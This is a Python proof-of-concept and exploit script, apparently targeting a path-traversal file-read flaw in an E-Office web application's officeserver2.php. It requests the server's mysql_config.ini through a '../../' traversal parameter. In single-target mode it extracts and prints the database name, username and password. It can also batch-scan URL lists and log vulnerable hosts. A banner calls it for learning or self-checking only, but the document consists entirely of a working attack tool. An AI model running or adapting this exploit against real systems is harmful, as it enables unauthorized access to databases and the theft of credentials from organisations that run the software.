# _*_ coding:utf-8 _*_
# @Time : 2023/10/7 20:52
# @Author: 为赋新词强说愁
 
 
# _*_ coding:utf-8 _*_
# @Time : 2023/8/3 22:30
# @Author: 为赋新词强说愁
 
 
 
import requests
import argparse
from datetime import datetime
import time
import re
requests.packages.urllib3.disable_warnings()
 
RED_BOLD = "\033[1;31m"
RESET = "\033[0m"
def usage():
    global RED_BOLD
    global RESET
    text = '''
    +-----------------------------------------------------------------+
    此脚本仅用于学习或系统自检查
    使用方法:
        单个 python3 E-OfficeReadfile.py -u url[例 http://127.0.0.1:8080]
        批量 python3 E-OfficeReadfile.py -f filename
    +-----------------------------------------------------------------+         
 
    '''
    print(f"{RED_BOLD}{text}{RESET}")
 
 
# proxies = {'http':'http://127.0.0.1:10808}
 
def exp(text):
    select = input("是否读取数据库用户名密码（是：1,否：0):")
    # usage()
    if select == "1":
        datauser_match = re.search(r'datauser\s*=\s*"([^"]+)"', text)
        datapassword_match = re.search(r'datapassword\s*=\s*"([^"]+)"', text)
        dataname_match = re.search(r'dataname\s*=\s*"([^"]+)"', text)
        print(f"数据库名称:{dataname_match.group(1)}登录用户名：{datauser_match.group(1)}，密码：{datapassword_match.group(1)}")
    elif select == "0":
        exit()
    else:
        print("请重新输入正确选项")
 
 
 
 
def save_file(url):
    with open('result.txt',mode='a',encoding='utf-8') as f:
        f.write(url+'\n')
 
def poc(check_url,flag):
    now_poc = datetime.now()
    global RED_BOLD
    global RESET
    url = check_url + "/iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../bin/mysql_config.ini"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "LOGIN_LANG=cn; PHPSESSID=04a96172088b1c74c8d6d7167934dd94",
    }
    try:
        response = requests.get(url, headers=headers, timeout=3, verify=False)
        content = response.content
        # 检查响应
        if response.status_code == 200 and content != None:
            if 'datauser' in response.text:
                print(f'{RED_BOLD}[+]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞存在{RESET}')
                save_file(check_url)
            else:
                print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞可能存在，但无法读取数据库账号密码')
        else:
            print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞不存在')
 
        if flag == 1:
            exp(response.text)
 
 
    except Exception as e:
        print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t无法访问，请检查目标站点是否存在')
 
 
def run(filepath):
    flag = 0
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        if 'http' in u:
            url = u
        elif 'https' in u:
            url = u
        else:
            url = 'http://' + u
 
        poc(url,flag)
 
def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="python E-OfficeReadfile.py -u url")
    parse.add_argument("-f", "--file", help="python E-OfficeReadfile.py -f file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    usage()
    time.sleep(1.5)
    if url is not None and filepath is None:
        flag = 1
        poc(url,flag)
    elif url is None and filepath is not None:
        run(filepath)
    else:
        usage()
 
 
if __name__ == '__main__':
    main()